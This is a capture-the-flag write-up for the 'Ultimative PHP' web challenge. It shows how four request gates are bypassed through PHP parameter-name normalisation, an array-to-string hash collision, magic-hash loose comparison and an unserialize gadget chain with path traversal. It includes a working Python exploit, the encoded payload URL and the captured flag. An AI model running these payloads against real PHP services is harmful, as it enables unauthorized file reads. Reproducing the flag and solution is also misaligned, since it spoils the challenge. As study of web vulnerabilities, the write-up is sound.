---
title: "Ultimative PHP"
category: "Web"
tags: ["php", "type-juggling", "magic-hash", "deserialization", "array-to-string", "lfi"]
solve_date: "2026-10-10"
language: "en"
---

# Ultimative PHP

**Flag:** `FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}`
**Service:** `https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com`. **Artifact:** `handout.zip` (5.9 KB), containing `src/index.php` (5862 B), `src/templates/welcome.txt` (46 B) and `flag.txt` (17 B).

## Challenge

The landing page is a "migration gateway" (`One request. Zero exceptions.`) that advertises four conditions: legacy MD5 digest, modern SHA-256 digest, PHP portable object (profile), and strict verification. The `/?manual=manual/operations.php` page lists the same four items:

```text
<div><dt>Recovery</dt><dd>Two distinct answers with matching fingerprints</dd></div>
<div><dt>Access</dt><dd>The protected administrator access level</dd></div>
<div><dt>Compatibility</dt><dd>A code accepted by both legacy hash formats</dd></div>
<div><dt>Profile</dt><dd>A Base64url-encoded PHP profile export</dd></div>
```

All logic lives in a single `src/index.php`, served by `php:8.3-cli` running `php -S 0.0.0.0:8080 -t /var/www/html`. The success page prints the flag through:

```php
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
```

The handout's `flag.txt` (17 B) contains `FortID{redacted}` — that is the placeholder the deploy script replaces from the `FLAG` environment variable, not the flag. The real container path is `/tmp/flag`, symlinked as `/flag`, and `entrypoint.sh` restricts the service to reading the flag from that file.

## Analysis

Four gates plus one file-read bug, all on the same GET request.

**Gate 1 — `access_level`.** `index.php:128` blocks the raw string while `index.php:132` requires the parsed value:

```php
$rawQuery = $_SERVER['QUERY_STRING'] ?? '';
if (str_contains(rawurldecode($rawQuery), 'access_level')) { fail_request('The access_level parameter is protected'); }
if (($_GET['access_level'] ?? '') !== 'administrator') { fail_request('Administrator access required'); }
```

`str_contains` works on the rawurl-decoded query string, while `$_GET` has already passed PHP's parameter-name normalisation, which converts spaces and dots in names to `_`. So `access%20level=administrator` does not contain `access_level` in the raw string yet still produces `$_GET['access_level'] = 'administrator'`.

**Gate 2 — `primary` / `backup`.** `index.php:136-159` requires two different answers that share one SHA-256:

```php
if (get_debug_type($primary) !== get_debug_type($backup)) { ... }
if ($primary === $backup) { ... }
$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial  = 'legacy-recovery:v1:' . $backup;
if (!hash_equals($primaryHash, $backupHash)) { ... }
```

Casting either array to a string yields the same `"Array"`, so `primary[]=1&backup[]=2` are two distinct arrays (`===` is false, `get_debug_type` is `array` for both) that produce identical digests. `hash_equals` cannot help here, because its two inputs were already equal before hashing.

**Gate 3 — magic hash.** `index.php:167-176`:

```php
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);
if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) { ... }
```

The strings must differ under `!==` yet compare equal under the loose `==`: a pair of all-digits-after-`0e` values, which PHP reads in scientific notation as zero. With the fixed prefix `ULTIMATIVE-PHP-2026:`, the answer was found by local brute force over `code`, requiring `md5[:9]` and `sha256[:9]` to both match `0e\d{7}` and to differ. `code=59036305` satisfies it:

```text
md5[:9]   = 0e3791209
sha256[:9]= 0e9920675
```

**Gate 4 — POP chain and the `strpos` bug.** `index.php:190-196` unserializes with an allowlist of two classes and requires a `MigratedProfile`:

```php
$profile = @unserialize($serializedProfile, ['allowed_classes' => [MigratedProfile::class, LegacyTemplate::class]]);
if (!$profile instanceof MigratedProfile) { fail_request('Unsupported profile type'); }
```

`(string) $profile` invokes `MigratedProfile::__toString()` (lines 9-12), which itself casts `$this->displayName`, so putting a `LegacyTemplate` there reaches `LegacyTemplate::__toString()` (lines 19-29):

```php
if (strpos($this->template, '../')) { return '[invalid template]'; }
$path = __DIR__ . '/templates/' . $this->template;
$contents = file_get_contents($path);
```

`strpos` returns `0` when the string **starts** with `../`, and `0` is falsy, so such a value passes. `__DIR__` is `/var/www/html`, therefore `../../../../tmp/flag` (exactly four levels) resolves to `/tmp/flag`. There is no `basename`, no prefix stripping, and `file_get_contents` reads the whole file.

The `manual` gate (`index.php:80-101`) applies `str_contains($manual, '../')` to the decoded value itself, so the `strpos` trick above does not transfer to it; `manual` only permits a `.php` suffix and is the single useful source-recon path.

## Solution

All four gates are satisfied in one GET. The serialized string to build is:

```text
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}
```

Its unpadded base64url form is the `profile` parameter. Full reproduction script:

```python
import base64, json, subprocess, sys, urllib.request, urllib.error

BASE = "https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/"
CODE = "59036305"

def b64url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

def get(query):
    req = urllib.request.Request(BASE + "?" + query, headers={"User-Agent": "curl/8"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, "ERR " + repr(e)

def s(t: str) -> str:
    return 's:%d:"%s";' % (len(t.encode()), t)

def legacy(template):
    body = 's:8:"template";' + s(template)
    return 'O:14:"LegacyTemplate":1:' + '{' + body + '}'

def profile(template=None):
    if template is None:
        inner = s("guest")
    else:
        inner = legacy(template)
    return 'O:15:"MigratedProfile":1:' + '{s:11:"displayName";' + inner + '}'

if __name__ == "__main__":
    template = None if len(sys.argv) < 2 else sys.argv[1]
    ser = profile(template)
    q = ("access%20level=administrator"
         "&primary[]=1&backup[]=2"
         "&code=" + CODE +
         "&profile=" + b64url(ser))
    st, body = get(q)
    print("QUERY:", q)
    print("STATUS:", st)
    print(body)
```

The gates were validated one by one in increasing order of difficulty before reading the flag. Against the live instance, `../../../../etc/hostname` returned the container hostname:

```text
../../../../etc/hostname => app
```

then the same construction was pointed at the flag path:

```text
../../../../tmp/flag => FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```

The final URL, kept verbatim:

```text
https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ
```

A separate single `curl` re-confirmed the result by keeping only the flag line of the HTML:

```console
$ curl -s 'https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ' | grep -o '<p class="flag">[^<]*'
<p class="flag">FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```

The magic-hash brute force is entirely local and instance-independent:

```python
import hashlib, itertools, os, sys
from multiprocessing import Pool

PREFIX = b'ULTIMATIVE-PHP-2026:'

def md5_magic(s):
    return s[0:1] == b'0' and s[1:2] == b'e' and all(48 <= c <= 57 for c in s[2:9])

def worker(args):
    start, stop = args
    n = start
    while n < stop:
        code = str(n).encode()
        m = hashlib.md5(PREFIX + code).hexdigest()[:9]
        if md5_magic(m.encode()):
            s = hashlib.sha256(PREFIX + code).hexdigest()[:9]
            if md5_magic(s.encode()) and m != s:
                return (n, m, s)
        n += 1
    return None

if __name__ == '__main__':
    lo = int(sys.argv[1]); hi = int(sys.argv[2]); tasks = int(os.cpu_count() or 4)
    step = (hi - lo) // tasks
    chunks = [(lo + i * step, lo + (i + 1) * step if i < tasks - 1 else hi) for i in range(tasks)]
    with Pool(tasks) as p:
        for r in p.imap_unordered(worker, chunks):
            if r:
                print('FOUND', r[0], 'md5=', r[1], 'sha256=', r[2], flush=True)
```

```text
FOUND 59036305 md5= 0e3791209 sha256= 0e9920675
```

## Result

```text
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```



## Reproduce

Requires Python 3 (`hashlib`, `urllib`, `base64`, `multiprocessing`). The payload construction and the brute force run locally; only the requests reading `etc/hostname` and `tmp/flag` need a live instance.

Optionally rebuild the environment from the handout with Docker:

```console
$ unzip handout.zip
$ cd ultimative_php
$ docker build -t ultimative-php -f deploy/Dockerfile .
$ docker run --rm -p 8080:8080 --tmpfs /tmp:rw,noexec,nosuid,nodev,size=1m -e 'FLAG=FortID{local_not_real}' ultimative-php
```

Save the first Python block as `solve.py` (point `BASE` at the instance, or at `http://127.0.0.1:8080/`), save the second Python block as `brute.py`, then:

```console
$ python3 brute.py 0 200000000
$ python3 solve.py '../../../../etc/hostname'
$ python3 solve.py '../../../../tmp/flag'
```

The four gates are designed to be passed simultaneously; missing any one returns `fail_request` with the matching message (`The access_level parameter is protected`, `Both recovery answers are required`, `Recovery fingerprints do not match`, `The compatibility code was rejected`, `Unsupported profile type`).
